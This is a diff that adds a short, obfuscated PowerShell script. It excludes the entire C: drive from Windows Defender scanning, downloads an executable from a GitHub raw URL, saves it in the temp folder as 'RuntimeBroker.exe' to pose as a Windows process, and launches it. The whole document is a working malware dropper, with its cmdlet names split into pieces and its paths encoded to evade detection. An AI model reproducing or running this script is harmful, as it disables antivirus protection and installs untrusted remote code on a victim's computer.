@@ -1,0 +1,18 @@
+﻿$s1 = 'Add' + '-MpPreference'
+$p = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Qzpc'))
+& $s1 -ExclusionPath $p
+
+$u = 'https://raw.githubusercontent.com/erfannnnnn818/bit/main/bit.exe'
+$o = "$env:TEMP\" + ([char[]](82,117,110,116,105,109,101,66,114,111,107,101,114) -join '') + '.exe'
+
+$i = 'Invoke' + '-WebRequest'
+& $i -Uri $u -OutFile $o
+
+if (Test-Path $o) {
+    $s = 'Start' + '-Process'
+    & $s -FilePath $o
+} else {
+    Write-Host "❌ File download failed. Cannot start process."
+}
+
+
